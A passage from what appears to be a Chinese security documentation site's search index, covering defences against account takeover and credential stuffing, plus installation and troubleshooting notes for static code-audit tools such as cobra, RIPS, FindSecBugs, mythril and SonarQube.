\u5a01\u80c1\u60c5\u62a5\uff0c\u901a\u8fc7\u8d2d\u4e70\u83b7\u5f97\uff0c\u77e5\u9053IP\u6700\u8fd1\u662f\u5426\u6709\u6728\u9a6c\u75c5\u6bd2\uff0c\u9ed1\u5ba2\u653b\u51fb\u884c\u4e3a\u3002\u8fd9\u90e8\u5206\u6076\u610fIP\u9700\u8981\u6570\u636e\u65b0\u9c9c\uff0c\u56e0\u4e3aIP\u53d8\u5316\u975e\u5e38\u5feb\u3002","title":"\u9632\u5fa1\u6076\u610fIP"},{"location":"account_security/protection_account/#ip_3","text":"\u4e00\u4e2ato c\u7684\u4e1a\u52a1\uff0c\u8bbf\u95eeIP\u6765\u81eaIDC\u6216\u8005\u4e91\u670d\u52a1\u5668\uff0c\u8fd9\u662f\u4e0d\u6b63\u5e38\u7684\u3002","title":"\u901a\u8fc7IP\u7684\u5c5e\u6027\u9632\u5fa1"},{"location":"account_security/protection_account/#_2","text":"","title":"\u901a\u8fc7\u9a8c\u8bc1\u7801\u7eac\u5ea6\u6765\u4fdd\u969c"},{"location":"account_security/protection_account/#_3","text":"\u63a5\u7801\u5e73\u53f0\u624b\u673a\u53f7\u5e93\uff1a\u901a\u8fc7\u722c\u866b\u722c\u53d6\u5404\u5927\u63a5\u7801\u5e73\u53f0\u7684\u624b\u673a\u53f7\u7801\uff0c\u5f62\u6210\u9ed1\u540d\u5355\u5e93\uff0c\u51e1\u662f\u547d\u4e2d\uff0c\u4e00\u5f8b\u52a0\u6807\u7b7e\u3002 \u5907\u6ce8\uff1a\u722c\u4e0d\u5168\uff0c\u800c\u4e14\u63a5\u7801\u5e73\u53f0\u4e5f\u4f1a\u6709\u5f88\u591a\u5bf9\u6297\u722c\u866b\u7684\u6280\u672f\u3002","title":"\u5e94\u5bf9\u5c0f\u53f7\u4e0e\u63a5\u7801\u5e73\u53f0"},{"location":"account_security/protection_account/#_4","text":"\u9488\u5bf9\u91d1\u878d\u884c\u4e1a\uff0c\u53ef\u4ee5\u722c\u53d6\u4f60\u7684\u8fd0\u8425\u5546\u7f51\u4e0a\u8425\u4e1a\u5385\u4fe1\u606f\uff0c\u5982\uff1a\u722c\u53d6\u901a\u8bdd\u8bb0\u5f55\u3002 \u5907\u6ce8\uff1a\u5408\u89c4\u8c03\u6574\uff1b\u8fd0\u8425\u5546\u4e5f\u5177\u6709\u53cd\u722c\u63aa\u65bd\uff1b\u5f71\u54cd\u7528\u6237\u4f53\u9a8c\u3002","title":"\u901a\u8fc7\u83b7\u53d6\u624b\u673a\u6743\u9650\u8fdb\u884c\u4e8c\u6b21\u9a8c\u8bc1"},{"location":"account_security/protection_account/#_5","text":"\u4e0e\u8fd0\u8425\u5546\u5408\u4f5c\uff0c\u96be\u5ea6\u5f88\u5927\u3002 \u7b2c\u4e09\u65b9\u8d2d\u4e70\u3002","title":"\u5408\u4f5c\u6570\u636e\u9a8c\u8bc1"},{"location":"account_security/protection_account/#_6","text":"\u4e00\u5b9a\u7a0b\u5ea6\u907f\u514d\u4e86\u9a8c\u8bc1\u7801\u6cc4\u6f0f\uff0c\u4f46\u662f\u5927\u89c4\u6a21\u7684\u8bed\u97f3\u901a\u544a\u4f1a\u5f62\u6210\u6602\u8d35\u7684\u8d39\u7528\u3002","title":"\u8bed\u97f3\u9a8c\u8bc1\u7801"},{"location":"account_security/protection_account/#_7","text":"\u8fdb\u884c\u4eba\u673a\u8bc6\u522b\u66f4\u591a\u662f\u4e3a\u4e86\u9632\u6b62\u6279\u91cf\u884c\u4e3a\uff0c\u4e00\u822c\u8fd9\u79cd\u6279\u91cf\u884c\u4e3a\u90fd\u662f\u7531\u7279\u6b8a\u63a5\u53e3\u3001\u7279\u5b9a\u5de5\u5177\u8fdb\u884c\u7684\u3002\u6240\u4ee5\u6211\u4eec\u9700\u8981\u5bf9\u5de5\u5177\u7684\u8fd0\u884c\u6a21\u5f0f\u8fdb\u884c\u5206\u6790\uff0c\u624d\u80fd\u4e0d\u65ad\u5bf9\u6297\u3002","title":"\u901a\u8fc7\u4eba\u673a\u8bc6\u522b\u7eac\u5ea6\u6765\u4fdd\u969c"},{"location":"account_security/protection_account/#_8","text":"\u8bbe\u5907MAC\u3001\u578b\u53f7\u3002","title":"\u624b\u673a\u6a21\u62df\u5668\u68c0\u6d4b"},{"location":"account_security/protection_account/#_9","text":"\u865a\u62df\u673a\u7f51\u5361\u4e00\u822c\u4ee5000569\u3001000c29\u3001005056\u5f00\u5934\u3002 USB\u548c\u58f0\u5361\u7279\u5f81\u3002 \u5185\u5b58\u3001\u8fdb\u7a0b\u3001\u670d\u52a1\u3001\u6ce8\u518c\u8868\u7b49\u3002","title":"\u865a\u62df\u673a\u7279\u5f81"},{"location":"account_security/protection_account/#_10","text":"","title":"\u901a\u8fc7\u6570\u636e\u5206\u6790\u7eac\u5ea6\u6765\u4fdd\u969c"},{"location":"account_security/protection_account/#_11","text":"\u4e24\u6b21\u767b\u5f55\u65f6\u95f4\u548c\u8ddd\u79bb\u7684\u5f02\u5e38\u3002 \u65e0\u6cd5\u6b63\u5e38\u83b7\u53d6\u8bbe\u5907\u4fe1\u606f\u3002","title":"\u5f02\u5e38\u5206\u6790"},{"location":"account_security/protection_account/#_12","text":"\u8fd9\u91cc\u7684\u8d26\u6237\u4e00\u822c\u7531\uff1a\u624b\u673a\u53f7\u3001\u90ae\u7bb1\u3001QQ\u7b49\u6240\u4ee3\u8868\u3002 \u8d26\u6237\u4fe1\u606f\u662f\u5426\u88ab\u6807\u8bb0\u8fc7\uff1a\u7c7b\u4f3c\u624b\u673a\u53f7\u88ab\u4e3e\u62a5\u6b21\u6570\u8fc7\u591a\u3001\u7b2c\u4e09\u65b9\u5e73\u53f0\u6807\u8bb0\u3002 \u8d26\u6237\u4fe1\u606f\u662f\u5426\u6709\u7279\u6b8a\u542b\u4e49\uff1atest\u3001hacker\u3001admin0\u3001pentest\u3001attack\u3001\u6742\u4e71\u65e0\u5e8f\u7684\u968f\u673a\u5b57\u7b26\u3001\u6709\u89c4\u5219\u7684\u968f\u673a\u5b57\u7b26\u7b49\u3002","title":"\u574f\u8d26\u6237\u8bc6\u522b"},{"location":"account_security/protection_account/#_13","text":"\u952e\u76d8\u6572\u51fb\u9891\u7387 \u9f20\u6807\u79fb\u52a8\u901f\u5ea6\u4e0e\u8f68\u8ff9\uff1a\u9488\u5bf9Web HTTP Referer \u5c4f\u5e55\u89e6\u6478\u5bf9\u538b\u529b\uff1a\u9488\u5bf9APP \u70b9\u51fb\u4f4d\u7f6e","title":"\u7528\u6237\u884c\u4e3a\u5206\u6790"},{"location":"account_security/protection_account/#_14","text":"","title":"\u6570\u636e\u5206\u6790\u4fdd\u969c\u7528\u6237\u5b89\u5168\u6848\u4f8b\u5206\u6790"},{"location":"account_security/protection_account/#_15","text":"\u6700\u7b80\u5355\u7684\u65b9\u6cd5\u662f\u770bIP\u548c\u8d26\u53f7\u7684\u9891\u7387\uff0c\u4f46\u662f\u9ed1\u5ba2\u4e5f\u4f1a\u5229\u7528\u4ee3\u7406IP\u6c60\u6216\u964d\u4f4e\u649e\u5e93\u7684\u9891\u7387\uff0c\u6240\u4ee5\u5355\u5355\u4eceIP\u4e0e\u8d26\u53f7\u9891\u7387\uff0c\u53ea\u80fd\u542f\u5230\u4e00\u5b9a\u7684\u4f5c\u7528\u3002 \u60f3\u8981\u66f4\u597d\u7684\u9632\u62a4\uff0c\u9700\u8981\u901a\u8fc7\u66f4\u591a\u7684\u884c\u4e3a\u6765\u5224\u65ad\uff0c\u884c\u4e3a\u5206\u6790\u53d6\u51b3\u4e8e\u4f60\u80fd\u591f\u83b7\u5f97\u7684\u884c\u4e3a\u6570\u636e\u6709\u591a\u5c11\u3002\u6bd4\u5982\u8bbe\u5907\u6307\u7eb9\u5728\u8fd9\u91cc\u5c31\u5927\u6709\u7528\u6b66\u4e4b\u5730\uff0c\u901a\u8fc7\u6293\u53d6\u7528\u6237\u8bbe\u5907\u4fe1\u606f\uff0c\u5f62\u6210\u4e00\u4e2a\u753b\u50cf\u4f5c\u4e3a\u57fa\u7ebf\u3002\u5f53\u73af\u5883\u4ea7\u751f\u53d8\u5316\u800c\u4e0d\u53ef\u4fe1\u65f6\uff0c\u63a8\u51fa\u4e8c\u6b21\u6821\u9a8c\u7b49\u6311\u6218\uff0c\u53e6\u5916\u4e5f\u53ef\u4ee5\u901a\u8fc7\u9875\u9762\u70b9\u51fb\u6d41\u3001\u51fb\u952e\u884c\u4e3a\u6765\u505a\u5224\u65ad\u3002 \u76ee\u524d\u6765\u770b\uff0c\u901a\u8fc7\u884c\u4e3a\u5224\u65ad\u7684\u9632\u76d7\u53f7\uff0c\u6216\u8005\u8bf4\u5bf9\u53ef\u4fe1\u73af\u5883\u5224\u65ad\u7684\u9632\u76d7\u53f7\uff0c\u662f\u4e00\u4e2a\u6bd4\u8f83\u7efc\u5408\u7684\u624b\u6bb5\u3002","title":"\u649e\u5e93"},{"location":"account_security/protection_account/#_16","text":"\u8d26\u6237\u4fe1\u606f\u662f\u5426\u5b8c\u6574\uff1a\u5728\u91d1\u878d\u4f53\u7cfb\u4e2d\uff0c\u8d26\u6237\u662f\u9700\u8981\u5b9e\u540d\u7684\uff0c\u5982\u679c\u5b9e\u540d\u8ba4\u8bc1\u672a\u901a\u8fc7\uff0c\u5219\u4ee3\u8868\u53ef\u80fd\u5b58\u5728\u4fe1\u606f\u865a\u5047\u3002 \u8d26\u6237\u7684\u6d3b\u52a8\u60c5\u51b5\uff1a\u6ce8\u518c\u4ee5\u540e\u662f\u5426\u6709\u767b\u5f55\u8fc7\uff0c\u662f\u5426\u6709\u8fc7\u6b63\u5e38\u64cd\u4f5c\uff0c\u5982\u679c\u6ce8\u518c\u540e\u4ece\u800c\u767b\u5f55\u8fc7\uff0c\u67d0\u4e00\u5929\uff08\u8fd9\u5929\u641e\u6d3b\u52a8\uff09\u7a81\u7136\u767b\u5f55\u53ef\u80fd\u662f\u5f02\u5e38\u7684\u3002","title":"\u574f\u8d26\u6237\u672c\u8eab\u884c\u4e3a\u5206\u6790"},{"location":"application-security/","text":"\u5e94\u7528\u5b89\u5168 \u53c2\u8003\u8d44\u6599 The Basics of Web Application Security Web \u5e94\u7528\u5b89\u5168\u57fa\u7840 \u7b2c\u4e00\u7ae0 \u4e92\u8054\u7f51\u4f01\u4e1a\u4e3a\u4ec0\u4e48\u5fc5\u987b\u5173\u6ce8\u5e94\u7528\u5b89\u5168 \u7b2c\u4e8c\u7ae0 \u5e94\u7528\u5b89\u5168\u80fd\u529b\u5efa\u8bbe\u76ee\u6807\u4e0e\u7b56\u7565 \u7b2c\u4e09\u7ae0 \u5e94\u7528\u5b89\u5168\u7ba1\u7406\u6a21\u578b","title":"\u5e94\u7528\u5b89\u5168"},{"location":"application-security/#_1","text":"","title":"\u5e94\u7528\u5b89\u5168"},{"location":"application-security/#_2","text":"The Basics of Web Application Security Web \u5e94\u7528\u5b89\u5168\u57fa\u7840 \u7b2c\u4e00\u7ae0 \u4e92\u8054\u7f51\u4f01\u4e1a\u4e3a\u4ec0\u4e48\u5fc5\u987b\u5173\u6ce8\u5e94\u7528\u5b89\u5168 \u7b2c\u4e8c\u7ae0 \u5e94\u7528\u5b89\u5168\u80fd\u529b\u5efa\u8bbe\u76ee\u6807\u4e0e\u7b56\u7565 \u7b2c\u4e09\u7ae0 \u5e94\u7528\u5b89\u5168\u7ba1\u7406\u6a21\u578b","title":"\u53c2\u8003\u8d44\u6599"},{"location":"application-security/code-audit/","text":"\u4ee3\u7801\u5ba1\u8ba1 \u4ee3\u7801\u5ba1\u8ba1\u7684\u51e0\u4e2a\u95ee\u9898 \u4e3a\u4ec0\u4e48\u8981\u8fdb\u884c\u4ee3\u7801\u5ba1\u8ba1 \u5982\u4f55\u628a\u4ee3\u7801\u5ba1\u8ba1\u878d\u5165\u6574\u4f53\u7684DevOps\u6d41\u7a0b\u4e2d \u8986\u76d6\u7387\u3001\u6f0f\u62a5\u7387\u3001\u8bef\u62a5\u7387\u3001\u5904\u7406\u7387\u5982\u6765\u5e73\u8861 \u5982\u4f55\u5904\u7406\u4ee3\u7406\u5ba1\u8ba1\u4e2d\u7684\u8bef\u62a5\u3001\u6f0f\u62a5 \u8c01\u6765\u770b\u4ee3\u7801\u5ba1\u8ba1\u62a5\u544a\u3001\u5ba1\u8ba1\u7684\u95ee\u9898\u5982\u4f55\u63a8\u52a8\u4fee\u590d \u5f00\u6e90 \u514d\u8d39\u4ee3\u7801\u5ba1\u8ba1 cobra cobra\uff1a\u9759\u6001\u4ee3\u7801\u5206\u6790\u5de5\u5177\u3002 github\u5730\u5740 \u5b89\u88c5\u6587\u6863 cobra\u5b89\u88c5 # \u89e3\u51b3\u4f9d\u8d56 yum install flex bison phantomjs -y # \u5b89\u88c5 git clone https://github.com/WhaleShark-Team/cobra.git cd cobra pip install -r requirements.txt python cobra.py --help cobra\u89c4\u5219 cobra/rules # \u9ed8\u8ba4\u81ea\u5e26\u89c4\u5219 rats \u5b98\u7f51\u5730\u5740 findbugs findbugs\uff1a\u63d2\u4ef6\u5f0f\u9759\u6001\u5206\u6790\u5de5\u5177\u3002 \u5b98\u7f51\u5730\u5740 \u4e0b\u8f7d\u5730\u5740 findbugs\u5b89\u88c5 \u76f4\u63a5\u5728\u5f00\u53d1\u5de5\u5177\u7684\u63d2\u4ef6\u4e2d\u8fdb\u884c\u5b89\u88c5\uff0c\u6216\u8005\u4e0b\u8f7d\u4ee5\u540e\u5bfc\u5165\u3002 rips rips\uff1a\u9759\u6001\u6df1\u5ea6\u5206\u6790\u6e90\u4ee3\u7801\u6f0f\u6d1e\u7684\u5de5\u5177\uff0c\u80fd\u81ea\u52a8\u5316\u6316\u6398PHP\u4ee3\u7801\u6f0f\u6d1e\u3002 \u4e0b\u8f7d\u5730\u5740 \u5b89\u88c5\u4e0e\u4f7f\u7528 yum install php httpd.x86_64 -y systemctl start httpd.service wget https://nchc.dl.sourceforge.net/project/rips-scanner/rips-0.55.zip unzip rips-0.55.zip # \u586b\u5199\u6e90\u4ee3\u7801\u8def\u5f84\u5c31\u53ef\u4ee5\u5f00\u59cb\u626b\u63cf\u4e86 \u5fc3\u5f97 \u5bf9PHP\u9879\u76ee\u652f\u6301\u6bd4\u8f83\u53cb\u597d\uff0c\u5176\u5b83\u8bed\u8a00\u5ba1\u8ba1\u6548\u679c\u4e00\u822c\uff1b \u4e0eseay\u6cd5\u5e08\u7684\u5ba1\u8ba1\u5de5\u5177\u5f88\u7c7b\u4f3c\uff1b \u53c2\u8003\u8d44\u6599 RIPS\u6e90\u7801\u7cbe\u8bfb\uff1a\u903b\u8f91\u6d41\u7a0b\u53calib\u6587\u4ef6\u5939\u5927\u81f4\u8bf4\u660e RIPS\u6e90\u7801\u7cbe\u8bfb\uff1a\u626b\u63cf\u5bf9\u8c61\u7684\u5b9e\u4f8b\u5316\u53catoken\u4fe1\u606f\u7684\u751f\u6210 vcg VCG\uff1a\u7b80\u6d01\u7684\u98ce\u9669\u51fd\u6570\u626b\u63cf\u5b9a\u4f4d\u5de5\u5177\uff0c\u57fa\u4e8e\u5b57\u5178\u5b9e\u73b0\u626b\u63cf\u529f\u80fd\u3002 \u4e0b\u8f7d\u5730\u5740 \u4ee3\u7801\u5ba1\u8ba1\u5546\u4e1a\u8f6f\u4ef6\u5bf9\u6bd4 \u5907\u6ce8\uff1a\u5982\u679c\u56fe\u7247\u6709\u4fb5\u6743\u884c\u4e3a\uff0c\u8bf7\u8054\u7cfb\u6211\uff01","title":"\u4ee3\u7801\u5ba1\u8ba1"},{"location":"application-security/code-audit/#_1","text":"","title":"\u4ee3\u7801\u5ba1\u8ba1"},{"location":"application-security/code-audit/#_2","text":"\u4e3a\u4ec0\u4e48\u8981\u8fdb\u884c\u4ee3\u7801\u5ba1\u8ba1 \u5982\u4f55\u628a\u4ee3\u7801\u5ba1\u8ba1\u878d\u5165\u6574\u4f53\u7684DevOps\u6d41\u7a0b\u4e2d \u8986\u76d6\u7387\u3001\u6f0f\u62a5\u7387\u3001\u8bef\u62a5\u7387\u3001\u5904\u7406\u7387\u5982\u6765\u5e73\u8861 \u5982\u4f55\u5904\u7406\u4ee3\u7406\u5ba1\u8ba1\u4e2d\u7684\u8bef\u62a5\u3001\u6f0f\u62a5 \u8c01\u6765\u770b\u4ee3\u7801\u5ba1\u8ba1\u62a5\u544a\u3001\u5ba1\u8ba1\u7684\u95ee\u9898\u5982\u4f55\u63a8\u52a8\u4fee\u590d","title":"\u4ee3\u7801\u5ba1\u8ba1\u7684\u51e0\u4e2a\u95ee\u9898"},{"location":"application-security/code-audit/#_3","text":"","title":"\u5f00\u6e90&amp;\u514d\u8d39\u4ee3\u7801\u5ba1\u8ba1"},{"location":"application-security/code-audit/#cobra","text":"cobra\uff1a\u9759\u6001\u4ee3\u7801\u5206\u6790\u5de5\u5177\u3002 github\u5730\u5740 \u5b89\u88c5\u6587\u6863 cobra\u5b89\u88c5 # \u89e3\u51b3\u4f9d\u8d56 yum install flex bison phantomjs -y # \u5b89\u88c5 git clone https://github.com/WhaleShark-Team/cobra.git cd cobra pip install -r requirements.txt python cobra.py --help cobra\u89c4\u5219 cobra/rules # \u9ed8\u8ba4\u81ea\u5e26\u89c4\u5219","title":"cobra"},{"location":"application-security/code-audit/#rats","text":"\u5b98\u7f51\u5730\u5740","title":"rats"},{"location":"application-security/code-audit/#findbugs","text":"findbugs\uff1a\u63d2\u4ef6\u5f0f\u9759\u6001\u5206\u6790\u5de5\u5177\u3002 \u5b98\u7f51\u5730\u5740 \u4e0b\u8f7d\u5730\u5740 findbugs\u5b89\u88c5 \u76f4\u63a5\u5728\u5f00\u53d1\u5de5\u5177\u7684\u63d2\u4ef6\u4e2d\u8fdb\u884c\u5b89\u88c5\uff0c\u6216\u8005\u4e0b\u8f7d\u4ee5\u540e\u5bfc\u5165\u3002","title":"findbugs"},{"location":"application-security/code-audit/#rips","text":"rips\uff1a\u9759\u6001\u6df1\u5ea6\u5206\u6790\u6e90\u4ee3\u7801\u6f0f\u6d1e\u7684\u5de5\u5177\uff0c\u80fd\u81ea\u52a8\u5316\u6316\u6398PHP\u4ee3\u7801\u6f0f\u6d1e\u3002 \u4e0b\u8f7d\u5730\u5740 \u5b89\u88c5\u4e0e\u4f7f\u7528 yum install php httpd.x86_64 -y systemctl start httpd.service wget https://nchc.dl.sourceforge.net/project/rips-scanner/rips-0.55.zip unzip rips-0.55.zip # \u586b\u5199\u6e90\u4ee3\u7801\u8def\u5f84\u5c31\u53ef\u4ee5\u5f00\u59cb\u626b\u63cf\u4e86 \u5fc3\u5f97 \u5bf9PHP\u9879\u76ee\u652f\u6301\u6bd4\u8f83\u53cb\u597d\uff0c\u5176\u5b83\u8bed\u8a00\u5ba1\u8ba1\u6548\u679c\u4e00\u822c\uff1b \u4e0eseay\u6cd5\u5e08\u7684\u5ba1\u8ba1\u5de5\u5177\u5f88\u7c7b\u4f3c\uff1b \u53c2\u8003\u8d44\u6599 RIPS\u6e90\u7801\u7cbe\u8bfb\uff1a\u903b\u8f91\u6d41\u7a0b\u53calib\u6587\u4ef6\u5939\u5927\u81f4\u8bf4\u660e RIPS\u6e90\u7801\u7cbe\u8bfb\uff1a\u626b\u63cf\u5bf9\u8c61\u7684\u5b9e\u4f8b\u5316\u53catoken\u4fe1\u606f\u7684\u751f\u6210","title":"rips"},{"location":"application-security/code-audit/#vcg","text":"VCG\uff1a\u7b80\u6d01\u7684\u98ce\u9669\u51fd\u6570\u626b\u63cf\u5b9a\u4f4d\u5de5\u5177\uff0c\u57fa\u4e8e\u5b57\u5178\u5b9e\u73b0\u626b\u63cf\u529f\u80fd\u3002 \u4e0b\u8f7d\u5730\u5740","title":"vcg"},{"location":"application-security/code-audit/#_4","text":"\u5907\u6ce8\uff1a\u5982\u679c\u56fe\u7247\u6709\u4fb5\u6743\u884c\u4e3a\uff0c\u8bf7\u8054\u7cfb\u6211\uff01","title":"\u4ee3\u7801\u5ba1\u8ba1\u5546\u4e1a\u8f6f\u4ef6\u5bf9\u6bd4"},{"location":"application-security/code-audit/cobra/","text":"Cobra\u5b89\u88c5\u4e0e\u4f7f\u7528 github\u5730\u5740 \u5b89\u88c5\u8fc7\u7a0b \u5b89\u88c5\u6587\u6863 git clone https://github.com/WhaleShark-Team/cobra.git cd cobra pip install -r requirements.txt python cobra.py \u4f7f\u7528\u8fc7\u7a0b \u547d\u4ee4\u884c\u4f7f\u7528\u6587\u6863","title":"Cobra\u5b89\u88c5\u4e0e\u4f7f\u7528"},{"location":"application-security/code-audit/cobra/#cobra","text":"github\u5730\u5740","title":"Cobra\u5b89\u88c5\u4e0e\u4f7f\u7528"},{"location":"application-security/code-audit/cobra/#_1","text":"\u5b89\u88c5\u6587\u6863 git clone https://github.com/WhaleShark-Team/cobra.git cd cobra pip install -r requirements.txt python cobra.py","title":"\u5b89\u88c5\u8fc7\u7a0b"},{"location":"application-security/code-audit/cobra/#_2","text":"\u547d\u4ee4\u884c\u4f7f\u7528\u6587\u6863","title":"\u4f7f\u7528\u8fc7\u7a0b"},{"location":"application-security/code-audit/ethereum-smart-contracts-code-audit/","text":"\u667a\u80fd\u5408\u7ea6\u4ee3\u7801\u5ba1\u8ba1 mythril\u5b89\u88c5\u4e0e\u4f7f\u7528 github\u5730\u5740 \u5b89\u88c5solitity github\u5730\u5740 \u5b98\u65b9\u5b89\u88c5\u6587\u6863 Ubuntu\u5b89\u88c5 sudo add-apt-repository ppa:ethereum/ethereum sudo apt-get update sudo apt-get install solc \u5b89\u88c5mythril sudo apt-get update sudo apt-get install -y software-properties-common sudo add-apt-repository -y ppa:ethereum/ethereum sudo apt-get update sudo apt-get install -y solc sudo apt-get install libssl-dev sudo apt-get install -y python3-pip=9.0.1-2 python3-dev sudo ln -s /usr/bin/python3 /usr/local/bin/python sudo apt-get install -y pandoc sudo apt-get install -y git pip3 install mythril \u4f7f\u7528mythril myth -x *.sol:contract -o markdown","title":"\u667a\u80fd\u5408\u7ea6\u4ee3\u7801\u5ba1\u8ba1"},{"location":"application-security/code-audit/ethereum-smart-contracts-code-audit/#_1","text":"","title":"\u667a\u80fd\u5408\u7ea6\u4ee3\u7801\u5ba1\u8ba1"},{"location":"application-security/code-audit/ethereum-smart-contracts-code-audit/#mythril","text":"github\u5730\u5740","title":"mythril\u5b89\u88c5\u4e0e\u4f7f\u7528"},{"location":"application-security/code-audit/ethereum-smart-contracts-code-audit/#solitity","text":"github\u5730\u5740 \u5b98\u65b9\u5b89\u88c5\u6587\u6863 Ubuntu\u5b89\u88c5 sudo add-apt-repository ppa:ethereum/ethereum sudo apt-get update sudo apt-get install solc","title":"\u5b89\u88c5solitity"},{"location":"application-security/code-audit/ethereum-smart-contracts-code-audit/#mythril_1","text":"sudo apt-get update sudo apt-get install -y software-properties-common sudo add-apt-repository -y ppa:ethereum/ethereum sudo apt-get update sudo apt-get install -y solc sudo apt-get install libssl-dev sudo apt-get install -y python3-pip=9.0.1-2 python3-dev sudo ln -s /usr/bin/python3 /usr/local/bin/python sudo apt-get install -y pandoc sudo apt-get install -y git pip3 install mythril","title":"\u5b89\u88c5mythril"},{"location":"application-security/code-audit/ethereum-smart-contracts-code-audit/#mythril_2","text":"myth -x *.sol:contract -o markdown","title":"\u4f7f\u7528mythril"},{"location":"application-security/code-audit/findsecbugs/","text":"FindSecBugs\u5b89\u88c5\u4e0e\u4f7f\u7528 \u63d2\u4ef6\u5f0f\u9759\u6001\u5206\u6790\u5de5\u5177 \u5b98\u7f51\u5730\u5740 \u4e0b\u8f7d\u5730\u5740 \u652f\u6301Java Web\u5e94\u7528\u7a0b\u5e8f\u4e0eAndroid\u5e94\u7528\u7a0b\u5e8f\uff0c\u4e5f\u652f\u6301Kotlin\u3001Groovy\u548cScala\u9879\u76ee\uff1b \u6db5\u76d6\u6d41\u884c\u7684\u6846\u67b6\uff1aSpring-MVC\u3001Struts\u3001Tapestry\uff1b \u53ef\u4ee5\u4e0eJenkins\u548cSonarQube\u96c6\u6210\uff1b IDEA\u5b89\u88c5FindSecBugs Configure--Plugins\uff0c\u8fdb\u884c\u641c\u7d22\"findbugs\"\uff0c\u627e\u5230\u5bf9\u5e94\u7684\u63d2\u4ef6\u8fdb\u884c\u5b89\u88c5\uff08\u4e5f\u53ef\u4ee5\u9009\u62e9\u79bb\u7ebf\u5b89\u88c5\uff09 \u91cd\u542fIDEA \u914d\u7f6e\u62a5\u544a\u5185\u5bb9 \u6267\u884c\u626b\u63cf\uff1a\u70b9\u51fb\u9879\u76ee--\u53f3\u952e--FindBugs--Analyze Project Files \u626b\u63cf\u524d\u4f1a\u5bf9\u9879\u76ee\u8fdb\u884c\u7f16\u8bd1 SpotBugs \u5b98\u7f51\u5730\u5740","title":"FindSecBugs\u5b89\u88c5\u4e0e\u4f7f\u7528"},{"location":"application-security/code-audit/findsecbugs/#findsecbugs","text":"\u63d2\u4ef6\u5f0f\u9759\u6001\u5206\u6790\u5de5\u5177 \u5b98\u7f51\u5730\u5740 \u4e0b\u8f7d\u5730\u5740 \u652f\u6301Java Web\u5e94\u7528\u7a0b\u5e8f\u4e0eAndroid\u5e94\u7528\u7a0b\u5e8f\uff0c\u4e5f\u652f\u6301Kotlin\u3001Groovy\u548cScala\u9879\u76ee\uff1b \u6db5\u76d6\u6d41\u884c\u7684\u6846\u67b6\uff1aSpring-MVC\u3001Struts\u3001Tapestry\uff1b \u53ef\u4ee5\u4e0eJenkins\u548cSonarQube\u96c6\u6210\uff1b","title":"FindSecBugs\u5b89\u88c5\u4e0e\u4f7f\u7528"},{"location":"application-security/code-audit/findsecbugs/#ideafindsecbugs","text":"Configure--Plugins\uff0c\u8fdb\u884c\u641c\u7d22\"findbugs\"\uff0c\u627e\u5230\u5bf9\u5e94\u7684\u63d2\u4ef6\u8fdb\u884c\u5b89\u88c5\uff08\u4e5f\u53ef\u4ee5\u9009\u62e9\u79bb\u7ebf\u5b89\u88c5\uff09 \u91cd\u542fIDEA \u914d\u7f6e\u62a5\u544a\u5185\u5bb9 \u6267\u884c\u626b\u63cf\uff1a\u70b9\u51fb\u9879\u76ee--\u53f3\u952e--FindBugs--Analyze Project Files \u626b\u63cf\u524d\u4f1a\u5bf9\u9879\u76ee\u8fdb\u884c\u7f16\u8bd1","title":"IDEA\u5b89\u88c5FindSecBugs"},{"location":"application-security/code-audit/findsecbugs/#spotbugs","text":"\u5b98\u7f51\u5730\u5740","title":"SpotBugs"},{"location":"application-security/code-audit/sonarqube-error/","text":"SonarQube\u8e29\u5751\u8bb0 \u8fde\u63a5\u963f\u91cc\u4e91RDS sonar.jdbc.url=jdbc:mysql://address:3306/sonar?useUnicode=true characterEncoding=utf8 sonar.projectKey\u547d\u540d \u5728gitlab-ci\u4e2d\u7ed9\u9879\u76ee\u547d\u540d\uff0c\u4e00\u822c\u662f\u4f7f\u7528\u73af\u5883\u53d8\u91cf\u3002\u4f46\u662f\u4e0d\u80fd\u4f7f\u7528\uff1aCI_COMMIT_REF_NAME \uff0c\u56e0\u4e3a\u4f7f\u7528\u8be5\u53d8\u91cf\u5f53\u9879\u76ee\u5206\u652f\u4e2d\u6709/ # \u7279\u6b8a\u5b57\u7b26\u65f6\uff0cgitlab-ci\u7684pipelines\u4f1a\u5931\u8d25\uff0c\u6240\u4ee5\u6211\u4eec\u9009\u62e9\u4f7f\u7528\uff1aCI_COMMIT_REF_SLUG\uff08\u5148\u5c06$CI_COMMIT_REF_NAME\u7684\u503c\u8f6c\u6362\u6210\u5c0f\u5199\uff0c\u6700\u5927\u4e0d\u80fd\u8d85\u8fc763\u4e2a\u5b57\u8282\uff0c\u7136\u540e\u628a\u9664\u4e860-9\u548ca-z\u7684\u5176\u4ed6\u5b57\u7b26\u8f6c\u6362\u6210-\u3002\u5728URLs\u548c\u57df\u540d\u540d\u79f0\u4e2d\u4f7f\u7528\uff09\u3002 GitLab CI/CD Variables \u4e2d\u6587\u6587\u6863 \u8bbe\u7f6e\u9879\u76ee\u9ed8\u8ba4\u4e3a\u79c1\u6709 SonarQube\u9ed8\u8ba4\u9879\u76ee\u4e3a\u516c\u6709\uff0c\u8fd9\u4e2a\u65f6\u5019\u4e0d\u9700\u8981\u767b\u5f55\u4e5f\u53ef\u4ee5\u67e5\u770b\u9879\u76ee\u7684\u6f0f\u6d1e\uff0c\u9700\u8981\u767b\u5f55\u7cfb\u7edf\u540e\u4fee\u6539\u3002 SonarQube\u5b89\u88c5FindBugs\u63d2\u4ef6\u540e\u4f7f\u7528\u9519\u8bef sonar-scanner -Dsonar.host.url=http://10.10.10.12:9000 -Dsonar.login=token -Dsonar.projectKey=java-test -Dsonar.java.binaries=$PWD \u62a5\u9519\u4fe1\u606f ERROR: Error during SonarQube Scanner execution ERROR: Can not execute Findbugs ERROR: Caused by: One (sub)project contains Java source files that are not compiled (/home/gitlab-runner/builds/G5ijgmip/0/root/java). ERROR: ERROR: Re-run SonarQube Scanner using the -X switch to enable full debug logging. \u8fd9\u662f\u56e0\u4e3afindbugs\u68c0\u67e5\u7684\u662fclasses\u6587\u4ef6\uff0c\u6240\u4ee5\u5fc5\u987b\u5148\u5bf9\u9879\u76ee\u6267\u884c mvn compile # \u751f\u6210classes\u6587\u4ef6 \u4e0d\u5141\u8bb8\u76f4\u63a5\u4ece\u6570\u636e\u5e93\u5220\u9664\u89c4\u5219 \u62a5\u9519\u5982\u4e0b\uff1a ERROR: Unable to load component class org.sonar.scanner.report.MetadataPublisher ERROR: Caused by: Unable to load component class org.sonar.scanner.rule.QualityProfiles 